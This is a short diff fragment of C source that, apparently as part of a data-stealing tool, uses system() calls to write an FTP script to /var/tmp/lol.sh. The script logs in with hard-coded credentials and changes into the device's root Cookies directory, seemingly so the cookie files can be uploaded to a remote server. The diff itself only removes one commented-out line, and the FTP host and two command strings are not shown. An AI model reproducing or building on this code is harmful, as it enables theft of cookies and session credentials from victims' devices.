@@ -39,7 +39,6 @@ int main(){
 	//Replace iphown iphown with your ftp user and password (I strongly reccomend creating a user just for this with limited privileges).
 	system("echo 'user iphown iphown' >> /var/tmp/lol.sh");
 	//This is where the real magic begins :)
-	//check later --> system("echo 'mkdir "system$HOSTNAME'");
 	system(command);
 	system(command2);
 	system("echo 'lcd /private/var/root/Library/Cookies' >> /var/tmp/lol.sh");
